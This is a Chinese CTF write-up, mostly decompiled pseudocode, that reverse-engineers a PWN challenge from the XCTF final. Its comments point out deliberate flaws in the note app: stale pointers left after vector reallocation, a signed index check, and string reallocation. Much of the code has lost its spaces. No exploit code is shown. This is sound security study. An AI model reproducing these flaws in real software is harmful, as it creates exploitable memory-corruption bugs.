# 详解第九届XCTF国际网络攻防联赛总决赛0解PWN题

> 原文: https://www.ctfiot.com/278572.html
> ID: 278572

存放指针数量过大时，重新申请一个chunk来存放，之前存放指针的chunk就会遗留note指针

申请note结构体时，该chunk是在某个bin链上的，可能会有chunk的指针进行遗漏


```
void__fastcall __noreturnmain(inta1,char**a2,char**a3){unsignedintvalue;// eax __int64 rd[625];// [rsp+8h] [rbp-1428h] BYREFstate_tstate;// [rsp+1390h] [rbp-A0h] BYREF _BYTE *v6;// [rsp+13C0h] [rbp-70h] __int64 str_like[4];// [rsp+13C8h] [rbp-68h] BYREFintv8;// [rsp+13ECh] [rbp-44h] _BYTE *v9;// [rsp+13F8h] [rbp-38h] _BYTE *v10;// [rsp+1400h] [rbp-30h]unsignedintv11;// [rsp+140Ch] [rbp-24h] __int64 src;// [rsp+1418h] [rbp-18h] BYREF _BYTE v13[16];// [rsp+1420h] [rbp-10h] BYREF v8 =0; sub_8AA10(128,0); rng_init_default_and_seccomp((__int64)rd); value = rng_next_value((std::random_device *)rd);//随机得到数值 srand(value);//设置srand的值 LODWORD(src) =0; v11 = rand() &0xFFFFFF0F;// 通过获得salt LODWORD(src) = v11; v10 = v13; v6 = v13;std::string::basic_string(str_like, &src,4); salt_set_value((__int64)str_like);std::string::~string(str_like); v9 = v13; sub_67C50(); salt_write_to_file();std::operator<<<std::char_traits<char>>(&std::cout,"Welcome to the All-Pwn-Red-Book App!n"); state_reset_counters(&state); menu_loop(&state);std::operator<<<std::char_traits<char>>(&std::cout,"Thank you for using the All-Pwn-Red-Book App!n"); debug_dump_salt(); _exit(0);}
```



```
voidmenu_loop(state_t*state){intp_n6;// [rsp+14h] [rbp-1Ch] BYREFunsigned__int64 v2;// [rsp+18h] [rbp-18h] v2 = __readfsqword(0x28u); p_n6 =0; setup_seccomp();while( p_n6 !=6) { print_menu(); std::istream::operator>>(&std::cin, &p_n6); if( (std::ios::fail((char*)&std::cin+ *(_QWORD *)(std::cin-24LL)) &1) !=0) { std::ios::clear((char*)&std::cin+ *(_QWORD *)(std::cin-24LL),0); cin_flush(); std::istream::ignore((std::istream *)&std::cin,0x7FFFFFFFFFFFFFFFLL,10); std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E09C); } else { cin_flush(); std::istream::ignore((std::istream *)&std::cin,0x7FFFFFFFFFFFFFFFLL,10); std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>); switch( p_n6 ) { case1: cmd_create_note(state); break; case2: cmd_list_notes(state); break; case3: cmd_edit_note(state); break; case4: cmd_show_note(state); break; case5: cmd_delete_note(state); break; case6: std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E0B2); break; default: std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E0C1); break; } std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>); } }}
```



```
voidcmd_create_note(state_t*state){ __int64 v1;// r14 _QWORD *v2;// r14 _QWORD *v3;// r14size_tv4;// rax __int64 v5;// [rsp+8h] [rbp-38h] __int64 v6;// [rsp+18h] [rbp-28h] BYREFintp_n6;// [rsp+24h] [rbp-1Ch] BYREFunsigned__int64 v8;// [rsp+28h] [rbp-18h] v8 = __readfsqword(0x28u);if( state->create_count <9) { ++state->create_count; print_help_lines(); std::istream::operator>>(&std::cin, &p_n6); if( (std::ios::fail((char*)&std::cin+ *(_QWORD *)(std::cin-24LL)) &1) !=0) { std::ios::clear((char*)&std::cin+ *(_QWORD *)(std::cin-24LL),0); cin_flush(); std::istream::ignore((std::istream *)&std::cin,0x7FFFFFFFFFFFFFFFLL,10); std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E229); } else { cin_flush(); std::istream::ignore((std::istream *)&std::cin,0x7FFFFFFFFFFFFFFFLL,10); v6 =0; switch( p_n6 ) { case1: v1 =operatornew(0x18u); TypeA_ctor(v1); v6 = v1; break; case2: v2 = (_QWORD *)operatornew(0x40u); TypeB_ctor(v2); v6 = (__int64)v2; break; case3: v3 = (_QWORD *)operatornew(0x30u); TypeC_ctor(v3); v6 = (__int64)v3; break; default: std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E229); break; } if( v6 ) { v5 = check_state_type((__int64 *)state); vec_push_back_ptr((__int64)state, (__int64)&v6); if( check_state_type((__int64 *)state) != v5 ) { v4 = vec_size(&state->vec); malloc(8* (v4 -1)); } } } }else { std::operator<<<std::char_traits<char>>(&std::cout, &STR_LIMIT_REACHED); }}
```



```
structType_A{ vtable *type_A; char* password; intval;}structvtable{ voidinit(); voiddestroy(); voidedit(); voidshow(); voidstats();}
```



```
structType_A{ vtable *type_B; char* password; charnote_content[0x30];}structvtable{ voidinit(); voiddestroy(); voidedit(); voidshow(); voidstats();}
```



```
structType_A{ vtable *type_C; char* password; char* note_content; longintnote_len; longintCapacity;}structvtable{ voidinit(); voiddestroy(); voidedit(); voidshow(); voidstats();}
```



```
voidcmd_list_notes(state_t*state){unsigned__int64 *p_ptr_value;// rax __int64 v3;// raxvoid**v4;// rax _QWORD *v5;// rdi __int64 v6;// raxsize_ti;// [rsp+8h] [rbp-18h]if( state->list_count ) { std::operator<<<std::char_traits<char>>(&std::cout, &STR_LIMIT_REACHED); }else { ++state->list_count; if( state_gate_check((__int64)state) ) { std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E897); } else { std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E0D7); for( i =0; i < vec_size(&state->vec); ++i ) { p_ptr_value = (unsigned__int64 *)vec_at_ptr(&state->vec, i); if( ptr_cookie_check((__int64)state, *p_ptr_value) ) { v3 =std::ostream::operator<<(&std::cout, i); std::operator<<<std::char_traits<char>>(v3,": "); v4 = vec_at_ptr(&state->vec, i); v5 = *v4; v6 = *(_QWORD *)*v4; if( (((v6 - (_QWORD)vtable_TypeA) <<58) | ((unsigned__int64)(v6 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } (*(void(__fastcall **)(_QWORD *))(v6 +0x20))(v5); } } } }}
```



```
if( (((v6 - (_QWORD)vtable_TypeA) <<58) | ((unsigned__int64)(v6 - (_QWORD)vtable_TypeA) >>6)) >3)
```



```
(*(void(__fastcall **)(_QWORD *))(v6 +0x20))(v5);
```



```
voidcmd_edit_note(state_t*state){intidx;// r14dunsigned__int64 *p_ptr_value;// rax __int64 v3;// rax __int64 v4;// [rsp+40h] [rbp-40h] BYREF __int64 prompt[7];// [rsp+48h] [rbp-38h] BYREF prompt[4] = __readfsqword(0x28u);if( state->edit_count <0xF) { ++state->edit_count; if( state_gate_check((__int64)state) ) { std::operator<<<std::char_traits<char>>(&std::cout, &STR_GATE_BLOCKED_GENERIC); } else { sub_67BC0((__int64)prompt, STR_PROMPT_INDEX, (__int64)&v4); idx = prompt_int((__int64)state, (__int64)prompt); std::string::~string(prompt); sub_67C50(); if( idx < (int)vec_size(&state->vec)// 有符号判断 && (p_ptr_value = (unsigned__int64 *)vec_at_ptr(&state->vec, idx), ptr_cookie_check((__int64)state, *p_ptr_value)) ) { v3 = *(_QWORD *)*vec_at_ptr(&state->vec, idx); if( (((v3 - (_QWORD)vtable_TypeA) <<58) | ((unsigned__int64)(v3 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } (*(void(**)(void))(v3 +16))(); } else { std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E8E4); } } }else { std::operator<<<std::char_traits<char>>(&std::cout, &STR_LIMIT_REACHED); }}
```



```
if( idx < (int)vec_size(&state->vec)
```



```
if( v6 ) { v5 = check_state_type((__int64 *)state); vec_push_back_ptr((__int64)state, (__int64)&v6); if( check_state_type((__int64 *)state) != v5 ) { v4 = vec_size(&state->vec); malloc(8* (v4 -1)); } }
```



```
unsigned__int64 __fastcallTypeA_edit(__int64 a1){unsigned__int64 v1;// rbx sub_6E5D0(); v1 = rand(); *(_DWORD *)(a1 +16) = v1 % sub_6E750(obj_);if( (((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) <<58) | ((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] }returnsub_6BD00(a1);}
```



```
unsigned__int64 __fastcallsub_6BD00(__int64 a1){ __int64 v1;// raxcharn_y_;// r14 __int64 v4;// [rsp+38h] [rbp-78h] BYREFchars[56];// [rsp+40h] [rbp-70h] BYREF __int64 v6[7];// [rsp+78h] [rbp-38h] BYREF v6[4] = __readfsqword(0x28u);if( !*(_QWORD *)(a1 +8) ) gotoLABEL_6;if( (((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) <<58) | ((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] }if( sub_6B4A0(a1) ) {LABEL_6: if( (((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) <<58) | ((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } sub_67BC0((__int64)v6,"Set as private post?", (__int64)&v4); n_y_ = sub_6C7D0(a1, v6); std::string::~string(v6); sub_67C50(); if( n_y_ =='y') { std::operator<<<std::char_traits<char>>(&std::cout,"Password: "); memset(s,0,0x30u); std::istream::getline((std::istream *)&std::cin, s,0x28); s[32] =0; if( sub_6C8A0(s) ) { *(_QWORD *)(a1 +8) = sub_6CA10(s); if( *(_QWORD *)(a1 +8) ) { strncpy(*(char**)(a1 +8), s,0x20u); *(_BYTE *)(*(_QWORD *)(a1 +8) +32LL) =0; } else { std::operator<<<std::char_traits<char>>(&std::cout,"Memory allocation failed for password.n"); } } else { std::operator<<<std::char_traits<char>>(&std::cout,"Invalid password format.n"); } } else { *(_QWORD *)(a1 +8) =0; } std::operator<<<std::char_traits<char>>(&std::cout,"Created Finish!n"); }else { v1 =std::operator<<<std::char_traits<char>>(&std::cout,"Incorrect password. Access denied."); std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>); }return__readfsqword(0x28u);}
```



```
_BOOL8 __fastcallsub_6C8A0(char*s){constvoid*haystack;// rbxsize_thaystacklen;// raxboolv3;// alintv5;// [rsp+18h] [rbp-28h]intv6;// [rsp+1Ch] [rbp-24h]intv7;// [rsp+20h] [rbp-20h]intv8;// [rsp+24h] [rbp-1Ch]intv9;// [rsp+28h] [rbp-18h] _BOOL4 v10;// [rsp+2Ch] [rbp-14h]inti;// [rsp+30h] [rbp-10h]charn___;// [rsp+37h] [rbp-9h]if( s ) { if( (unsignedint)strlen(s) ==32) { v5 =0; v6 =0; v7 =0; v8 =0; v9 =1; haystack = (constvoid*)sub_6CA70(); haystacklen = sub_6CA90(); v10 = memmem(haystack, haystacklen, s,0x20u) ==0; for( i =0; i <32; ++i ) { n___ = s[i]; if( n___ <'!'|| n___ >'~') v9 =0; if( n___ <'A'|| n___ >'Z') { if( n___ <'a'|| n___ >'z') { if( n___ <48|| n___ >57) v8 =1; else v7 =1; } else { v6 =1; } } else { v5 =1; } } v3 =0; if( v9 ) { v3 =0; if( v8 + v7 + v6 + v5 >=3) returnv10; } returnv3; } else { return0; } }else { return0; }}
```



```
unsigned__int64 __fastcallsub_6DA70(_QWORD *a1){ __int64 v1;// rax __int64 v2;// rax __int64 v4;// [rsp+28h] [rbp-88h] __int64 v5;// [rsp+30h] [rbp-80h] __int64 v6;// [rsp+38h] [rbp-78h] __int64 v7;// [rsp+40h] [rbp-70h]unsigned__int64 i;// [rsp+48h] [rbp-68h] __int64 v9;// [rsp+50h] [rbp-60h] BYREFcharv10;// [rsp+5Fh] [rbp-51h] BYREF __int64 v11;// [rsp+60h] [rbp-50h] BYREF __int64 p_n47;// [rsp+68h] [rbp-48h] BYREF __int64 v13;// [rsp+70h] [rbp-40h] BYREF __int64 p_G_SALT_STR[7];// [rsp+78h] [rbp-38h] BYREF p_G_SALT_STR[4] = __readfsqword(0x28u);std::operator<<<std::char_traits<char>>(&std::cout,"Please enter note content: ");if( (((*a1 - (_QWORD)vtable_TypeA) <<58) | ((*a1 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } sub_6BC70(p_G_SALT_STR); v13 =std::string::length(p_G_SALT_STR, a1); p_n47 =47; i = *sub_6AE50((unsigned__int64 *)&v13, (unsigned__int64 *)&p_n47);if( (((*a1 - (_QWORD)vtable_TypeA) <<58) | ((*a1 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } sub_6BD00((__int64)a1);// 设置密码if( a1[1] )//如果设置密码 { v4 =std::string::begin(p_G_SALT_STR); v11 =std::string::begin(p_G_SALT_STR); v5 = sub_6C5A0(&v11, i); v1 = sub_6DE60((__int64)(a1 +2)); sub_6E0F0(v4, v5, v1); sub_6DEC0((__int64)(a1 +2), (constchar*)a1[1], i); }else { v10 =0; sub_6E170((__int64)(a1 +2), (__int64)&v10); v6 =std::string::begin(p_G_SALT_STR); v9 =std::string::begin(p_G_SALT_STR); v7 = sub_6C5A0(&v9, i); v2 = sub_6DE60((__int64)(a1 +2)); sub_6E0F0(v6, v7, v2); }std::string::~string(p_G_SALT_STR);return__readfsqword(0x28u);}
```



```
unsigned__int64 __fastcallsub_6BC70(__int64 *p_G_SALT_STR){ __int64 p_G_SALT_STRa[7];// [rsp+28h] [rbp-38h] BYREF p_G_SALT_STRa[4] = __readfsqword(0x28u);std::string::basic_string(p_G_SALT_STRa);std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, p_G_SALT_STRa); sub_6CAB0(p_G_SALT_STR, p_G_SALT_STRa);//base64解密std::string::~string(p_G_SALT_STRa);return__readfsqword(0x28u);}
```



```
unsigned__int64 __fastcallsub_6CAB0(__int64 *str_like, __int64 *p_G_SALT_STR){void*v2;// rax __int64 v3;// raxstd::runtime_error *exception;// rbx __int64 v5;// raxconstchar*s;// rax exception *exception_1;// rbx _QWORD *v8;// rax __int64 v9;// rax __int64 v10;// r14 __int64 v11;// r12intv12;// eax exception *exception_2;// rbx _QWORD *src;// rax __int64 v16;// [rsp+58h] [rbp-78h]intn4;// [rsp+64h] [rbp-6Ch] _BYTE v18[8];// [rsp+80h] [rbp-50h] BYREF __int64 v19[3];// [rsp+88h] [rbp-48h] BYREF _BYTE v20[8];// [rsp+A0h] [rbp-30h] BYREFunsigned__int64 v21;// [rsp+A8h] [rbp-28h] v21 = __readfsqword(0x28u); v2 = sub_765C0(); v3 = sub_6F7A0((__int64)v2); sub_6CDD0((__int64)v20, v3);if( !sub_6CE00((__int64)v20) ) { exception = (std::runtime_error *)__cxa_allocate_exception(0x10u); std::runtime_error::runtime_error(exception, &Invalid_ciphertext_size__); __cxa_throw( exception, (struct type_info *)&`typeinfofor'std::runtime_error, (void(*)(void*))&std::runtime_error::~runtime_error); } v5 = sub_6CE30((__int64)v20); sub_6F930(v5,256); s = (constchar*)std::string::c_str(p_G_SALT_STR); v16 = sub_72B50(s,0xFFFFFFFFLL);if( !v16 ) { exception_1 = (std::runtime_error *)__cxa_allocate_exception(0x10u); std::runtime_error::runtime_error(exception_1, &Invalid_ciphertext_size__); __cxa_throw( exception_1, (struct type_info *)&`typeinfofor'std::runtime_error, (void(*)(void*))&std::runtime_error::~runtime_error); } v8 = (_QWORD *)sub_6CE30((__int64)v20); sub_70510(v8, v16); v9 =std::string::length(p_G_SALT_STR, v16); sub_6CE50((__int64)v19, v9, (__int64)v18); sub_67C50(); v10 = sub_6CE30((__int64)v20); v11 = sub_6CEC0(v19); v12 = sub_6CEE0(v19); n4 = sub_6F9C0(v10, v11, v12);if( n4 <0) { exception_2 = (std::runtime_error *)__cxa_allocate_exception(0x10u); std::runtime_error::runtime_error(exception_2, &Invalid_ciphertext_size__); __cxa_throw( exception_2, (struct type_info *)&`typeinfofor'std::runtime_error, (void(*)(void*))&std::runtime_error::~runtime_error); } src = (_QWORD *)sub_6CEC0(v19);std::string::basic_string(str_like, src, n4); sub_67C50(); sub_6CF00(v19); sub_6CF70((__int64)v20);return__readfsqword(0x28u);}
```



```
v6 =std::string::begin(p_G_SALT_STR);//base64解码字符长度 v9 =std::string::begin(p_G_SALT_STR); v7 = sub_6C5A0(&v9, i);//返回我们刚刚传入的base64解码结果的字符串 v2 = sub_6DE60((__int64)(a1 +2));//返回type_B的note区域 sub_6E0F0(v6, v7, v2);//将结果复制到type_B的note位置
```



```
char*__fastcallsub_6E2F0(char*src, __int64 a2,char*dest){size_tn;// [rsp+18h] [rbp-8h] n = a2 - (_QWORD)src;if( a2 - (__int64)src <=1) { if( n ==1) sub_6E360(dest, src); }else { memmove(dest, src, n); }return&dest[n];}
```



```
unsigned__int64 __fastcallsub_6DEC0(__int64 a1,constchar*s,unsigned__int64 i){charv3;// bl _BYTE *v4;// raxunsigned__int64 ia;// [rsp+50h] [rbp-60h] __int64 v8;// [rsp+58h] [rbp-58h] BYREF __int64 v9[4];// [rsp+60h] [rbp-50h] BYREF _BYTE s_1[32];// [rsp+80h] [rbp-30h] BYREFunsigned__int64 v11;// [rsp+A0h] [rbp-10h] v11 = __readfsqword(0x28u); sub_67BC0((__int64)v9, s, (__int64)&v8); sub_6B800((__int64)v9, s_1);std::string::~string(v9); sub_67C50();for( ia =0; ia < i && *(_BYTE *)sub_6E000(a1, ia); ++ia ) { v3 = s_1[ia &0x1F]; v4 = (_BYTE *)sub_6E000(a1, ia); *v4 ^= v3; }return__readfsqword(0x28u);}
```



```
unsigned __int64 __fastcall sub_6B800(__int64 a1, _BYTE *s){ int v2; // ebx int v3; // eax __int64 p_G_SALT_STR[7]; // [rsp+28h] [rbp-38h] BYREF p_G_SALT_STR[4] = __readfsqword(0x28u); std::operator+<char>(p_G_SALT_STR); v2 = std::string::c_str(p_G_SALT_STR); v3 = std::string::size(p_G_SALT_STR); sub_A6450(v2, v3, s); std::string::~string(p_G_SALT_STR); return __readfsqword(0x28u);}
```



```
_BYTE *__fastcallsub_A6450(inta1,inta2, _BYTE *s){ _BYTE *s_1;// r12 s_1 = s;if( !s ) s_1 = &byte_3ABC20;if( !(unsignedint)sub_187820(0, (unsignedint)"SHA256",0, a1, a2, s_1,0) ) return0;returns_1;}
```



```
unsigned__int64 __fastcallsub_6BF50(__int64 *str_like,void*p_G_SALT_STR, __int64 a3){void*ivlen;// raxintv4;// eax __int64 v5;// rbx __int64 v6;// r12intv7;// eax __int64 v8;// rax __int64 *ptr;// [rsp+48h] [rbp-D8h]intv11;// [rsp+54h] [rbp-CCh]intv12;// [rsp+54h] [rbp-CCh]intv13;// [rsp+5Ch] [rbp-C4h] BYREF __int64 p_G_SALT_STR_1[4];// [rsp+60h] [rbp-C0h] BYREF __int64 str_likea[4];// [rsp+80h] [rbp-A0h] BYREF __int64 p_G_SALT_STRa[4];// [rsp+A0h] [rbp-80h] BYREFunsignedint*src[2];// [rsp+C0h] [rbp-60h] BYREF _QWORD s[10];// [rsp+D0h] [rbp-50h] BYREF s[5] = __readfsqword(0x28u); sub_6B800(a3, s);//对密码进行sha256计算 src[0] = (unsignedint*)s[0];//复制sha256结果前八字节 src[1] = (unsignedint*)s[1];//src是sha256的前0x10字节 ptr = (__int64 *)sub_7AB30(); ivlen = sub_79EC0();// ivlen长度 sub_7DD40(ptr, (__int64)ivlen,0, (__int64)s, src);// 设置iv为src，密钥为sha256完整结果if( (std::string::size(p_G_SALT_STR) &0xF) ==0) sub_7BDB0(ptr,0);std::string::basic_string(p_G_SALT_STRa); v4 =std::string::size(p_G_SALT_STR);std::string::resize(p_G_SALT_STRa, v4 +0x10); v5 =std::string::operator[](p_G_SALT_STRa,0); v6 =std::string::data(p_G_SALT_STR); v7 =std::string::size(p_G_SALT_STR); sub_7AE90(ptr, v5, &v13, v6, v7); v11 = v13; v8 =std::string::operator[](p_G_SALT_STRa,0); sub_7B090(ptr, v11 + v8, &v13); v12 = v13 + v11; sub_7CE10(ptr);std::string::basic_string(str_likea, src,16);std::string::substr(p_G_SALT_STR_1, p_G_SALT_STRa,0, v12); sub_6C700(str_like, str_likea, p_G_SALT_STR_1);std::string::~string(p_G_SALT_STR_1);std::string::~string(str_likea); sub_67C50();std::string::~string(p_G_SALT_STRa);return__readfsqword(0x28u);}
```



```
__int64 __fastcallsub_6C230(__int64 a1, __int64 *p_G_SALT_STR, __int64 str_like){unsigned__int64 v3;// rbxintn;// eax __int64 v6;// [rsp+10h] [rbp-30h] __int64 v7;// [rsp+18h] [rbp-28h] __int64 v8;// [rsp+20h] [rbp-20h] v3 =std::string::capacity(p_G_SALT_STR);// 查看type_C的capacity值if( v3 <std::string::size(str_like) )// 对我们密文长度与capacity值进行比对，如果大于capacity，把原来的note_content指针的chunk进行free returnstd::string::operator=(p_G_SALT_STR, str_like); n =std::string::size(str_like);std::string::resize(p_G_SALT_STR, n); v6 =std::string::begin(str_like); v7 =std::string::end(str_like); v8 =std::string::begin(p_G_SALT_STR);returnsub_6C2D0(v6, v7, v8);//复制结果}
```



```
char*__fastcallsub_6C650(constvoid*src, __int64 a2,char*dest){size_tn;// [rsp+18h] [rbp-8h] n = a2 - (_QWORD)src;if( a2 - (__int64)src <=1) { if( n ==1) sub_6C6C0(dest, src); }else { memmove(dest, src, n); }return&dest[n];}
```



```
voidcmd_show_note(state_t*state){intidx;// r14dunsigned__int64 *p_ptr_value;// rax __int64 v3;// rax __int64 v4;// [rsp+40h] [rbp-40h] BYREF __int64 prompt[7];// [rsp+48h] [rbp-38h] BYREF prompt[4] = __readfsqword(0x28u);if( state->show_count <5) { ++state->show_count; if( state_gate_check((__int64)state) ) { std::operator<<<std::char_traits<char>>(&std::cout, &STR_GATE_BLOCKED); } else { sub_67BC0((__int64)prompt, STR_PROMPT_INDEX, (__int64)&v4); idx = prompt_int((__int64)state, (__int64)prompt); std::string::~string(prompt); sub_67C50(); if( idx < vec_size(&state->vec)// 无符号判断 && (p_ptr_value = (unsigned__int64 *)vec_at_ptr(&state->vec, idx), ptr_cookie_check((__int64)state, *p_ptr_value)) ) { v3 = *(_QWORD *)*vec_at_ptr(&state->vec, idx); if( (((v3 - (_QWORD)vtable_TypeA) <<58) | ((unsigned__int64)(v3 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } (*(void(**)(void))(v3 +24))(); } else { std::operator<<<std::char_traits<char>>(&std::cout,"Invalid number.n"); } } }else { std::operator<<<std::char_traits<char>>(&std::cout, &STR_LIMIT_REACHED); }}
```



```
v1 = sub_6DE20(a1 +16);// 得到note_content开始地址 v2 = sub_6DE40(a1 +16);// 得到note_content结束地址 v3 = sub_6DE60((__int64)v8);// 设置v3为v8的指针 sub_6DE80(v1, v2, v3);// 将note_content的内容复制到note_content
```



```
sub_6DEC0((__int64)v8, *(constchar**)(a1 +8),0x30u);unsigned__int64 __fastcallsub_6DEC0(__int64 a1,constchar*s,unsigned__int64 i){charv3;// bl _BYTE *v4;// raxunsigned__int64 ia;// [rsp+50h] [rbp-60h] __int64 v8;// [rsp+58h] [rbp-58h] BYREF __int64 v9[4];// [rsp+60h] [rbp-50h] BYREF _BYTE s_1[32];// [rsp+80h] [rbp-30h] BYREFunsigned__int64 v11;// [rsp+A0h] [rbp-10h] v11 = __readfsqword(0x28u); sub_67BC0((__int64)v9, s, (__int64)&v8); sub_6B800((__int64)v9, s_1);std::string::~string(v9); sub_67C50();for( ia =0; ia < i && *(_BYTE *)sub_6E000(a1, ia); ++ia )// sub_6E000() 返回下一个字符，不为x00继续 { v3 = s_1[ia &0x1F]; v4 = (_BYTE *)sub_6E000(a1, ia); *v4 ^= v3; }return__readfsqword(0x28u);}
```



```
unsigned__int64 __fastcallsub_6B140(__int64 a1){ __int64 v1;// raxvoid*p__ZSt4cout;// rax __int64 v3;// rax __int64 v4;// rbx __int64 v5;// rsi __int64 v6;// rbx __int64 v7;// rax __int64 v8;// rax __int64 v9;// rax __int64 v10;// raxinti;// [rsp+3Ch] [rbp-94h]unsigned__int8 v13;// [rsp+40h] [rbp-90h] __int64 v14;// [rsp+48h] [rbp-88h] BYREF _BYTE s[40];// [rsp+50h] [rbp-80h] BYREF __int64 v16[4];// [rsp+78h] [rbp-58h] BYREF __int64 prompt[7];// [rsp+98h] [rbp-38h] BYREF prompt[4] = __readfsqword(0x28u);if( (std::string::empty((__int64 *)(a1 +16)) &1) !=0) { v1 =std::operator<<<std::char_traits<char>>(&std::cout,"Note Content: (empty)"); std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>); }elseif( *(_QWORD *)(a1 +8) ) { if( (((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) <<58) | ((*(_QWORD *)a1 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } if( sub_6B4A0(a1) ) { sub_67BC0((__int64)v16, *(constchar**)(a1 +8), (__int64)&v14); sub_6B550(prompt, (void*)(a1 +16), (__int64)v16); std::string::~string(v16); sub_67C50(); p__ZSt4cout = (void*)std::operator<<<std::char_traits<char>>(&std::cout,"Note Content: "); v3 =std::operator<<<char>(p__ZSt4cout, prompt); std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>); std::string::~string(prompt); } else { memset(s,0,0x20u); sub_6B800(a1 +16, s); std::operator<<<std::char_traits<char>>(&std::cout,"Note Content: *** ("); for( i =0; i <32; ++i ) { v4 =std::ostream::operator<<(&std::cout, sub_6B8A0); v5 = (unsignedint)sub_6B8D0(); v6 =std::operator<<<char,std::char_traits<char>>(v4, v5); v13 = sub_6B8F0(); v7 =std::operator<<<char,std::char_traits<char>>(v6, v13); std::ostream::operator<<(v7, (unsigned__int8)s[i]); } v8 =std::ostream::operator<<(&std::cout, sub_6B910); v9 =std::operator<<<std::char_traits<char>>(v8,") ***"); std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>); } }else { v10 =std::operator<<<std::char_traits<char>>(&std::cout,"No no no!"); std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>); }return__readfsqword(0x28u);}
```



```
// 删除流程：先调用对象虚表+8（析构/释放），随后从容器中移除元素（vec_erase_at）。voidcmd_delete_note(state_t*state){intidx;// r14dunsigned__int64 *p_ptr_value;// raxvoid*v4;// rdi __int64 v5;// rax __int64 v6;// rax __int64 vec;// [rsp+48h] [rbp-58h] BYREF __int64 safe_ptr;// [rsp+50h] [rbp-50h] BYREF __int64 elem_ptr;// [rsp+58h] [rbp-48h] BYREF __int64 v10;// [rsp+60h] [rbp-40h] BYREF __int64 prompt[7];// [rsp+68h] [rbp-38h] BYREF prompt[4] = __readfsqword(0x28u);if( state->delete_count <6) { ++state->delete_count; if( state_gate_check((__int64)state) ) { std::operator<<<std::char_traits<char>>(&std::cout, &unk_28E934); } else { sub_67BC0((__int64)prompt, STR_PROMPT_INDEX, (__int64)&v10); idx = prompt_int((__int64)state, (__int64)prompt); std::string::~string(prompt); sub_67C50(); if( idx < (int)vec_size(&state->vec) && (p_ptr_value = (unsigned__int64 *)vec_at_ptr(&state->vec, idx), ptr_cookie_check((__int64)state, *p_ptr_value)) ) { v4 = *vec_at_ptr(&state->vec, idx); if( v4 ) { if( (((*(_QWORD *)v4 - (_QWORD)vtable_TypeA) <<58) | ((*(_QWORD *)v4 - (_QWORD)vtable_TypeA) >>6)) >3) __asm { ud1 eax, dword ptr [eax+2] } (*(void(**)(void))(*(_QWORD *)v4 +8LL))(); } vec = vec_start_ptr(state); safe_ptr = vec_slot_addr(&vec, idx); read_qword_indirect(&elem_ptr, (__int64)&safe_ptr); sub_69C50((__int64)state, elem_ptr); v5 =std::operator<<<std::char_traits<char>>(&std::cout,"Note "); v6 =std::ostream::operator<<(v5, idx); std::operator<<<std::char_traits<char>>(v6," deleted.n"); } else { std::operator<<<std::char_traits<char>>(&std::cout,"Invalid number.n"); } } }else { std::operator<<<std::char_traits<char>>(&std::cout, &STR_LIMIT_REACHED); }}
```



```
sub_69C50((__int64)state, elem_ptr);__int64sub_69C50(__int64 state, __int64 elem_ptr){ __int64 idx;// rax __int64 erased_elem_addr;// [rsp+10h] [rbp-30h] __int64 v5;// [rsp+18h] [rbp-28h] BYREF __int64 vec;// [rsp+20h] [rbp-20h] BYREF _QWORD v7[3];// [rsp+28h] [rbp-18h] BYREF v7[1] = __readfsqword(0x28u); v7[0] = elem_ptr; vec = vec_start_ptr((_QWORD *)state); v5 = sub_69CE0((_QWORD *)state); idx = sub_69D30((__int64)v7, (__int64)&v5); erased_elem_addr = vec_slot_addr(&vec, idx);// erased_elem_addr就是我们刚刚idx索引到的指向note指针的指针returnvec_erase_shift_finalize(state, erased_elem_addr);// state是存放note数值的地址，进行左移8位拷贝}vec_erase_shift_finalize(state, erased_elem_addr);// 擦除位置 a2 后做向前搬移：若 [slot(1), finish) 非空，调用 vec_memmove_wrap 进行 memmove；最后 finish -= 8。返回被擦除位置。__int64vec_erase_shift_finalize(__int64 vec_state, __int64 erased_elem_addr){ __int64 dst_addr;// [rsp+38h] [rbp-48h] __int64 src_addr;// [rsp+40h] [rbp-40h] __int64 finish_ptr_addr;// [rsp+50h] [rbp-30h] BYREF __int64 start_ptr_addr;// [rsp+58h] [rbp-28h] BYREF __int64 vec[4];// [rsp+60h] [rbp-20h] BYREF vec[2] = __readfsqword(0x28u); vec[0] = erased_elem_addr; start_ptr_addr = vec_slot_addr(vec,1); finish_ptr_addr = vec_finish_ptr(vec_state);if( ptr_range_nonempty((__int64)&start_ptr_addr, (__int64)&finish_ptr_addr) ) { dst_addr = vec_slot_addr(vec,1); src_addr = vec_finish_ptr(vec_state); vec_memmove_wrap(dst_addr, src_addr, vec[0]); } *(_QWORD *)(vec_state +8) -=8LL;returnvec[0];}//vec_memmove_wrap自行深入分析
```



```
